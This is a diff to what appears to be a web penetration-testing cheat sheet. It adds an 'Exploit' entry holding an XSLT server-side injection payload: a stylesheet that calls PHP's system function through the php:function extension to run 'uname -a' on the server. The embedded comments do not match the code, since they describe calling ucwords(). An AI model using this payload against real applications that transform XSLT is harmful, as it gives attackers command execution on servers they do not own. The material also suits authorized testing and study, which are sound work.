@@ -1069,11 +1069,22 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ### Exploit 
 -> ok.xsl
 ```
-
-
-detect.xsl
-
-https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations
+<!--
+- Simple test to call php function
+-->
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
+xmlns:php="http://php.net/xsl"
+version="1.0">
+<!-- We add the PHP's xmlns -->
+ <xsl:template match="/">
+ <html>
+ <!-- We use the php suffix to call the function ucwords() -->
+ <xsl:value-of select="php:function('system','uname -a')" />
+ <!-- Output: 'Php Can Now Be Used In Xsl' -->
+ </html>
+ </xsl:template>
+</xsl:stylesheet>
+```
 
 ## Prototype Pollution
 
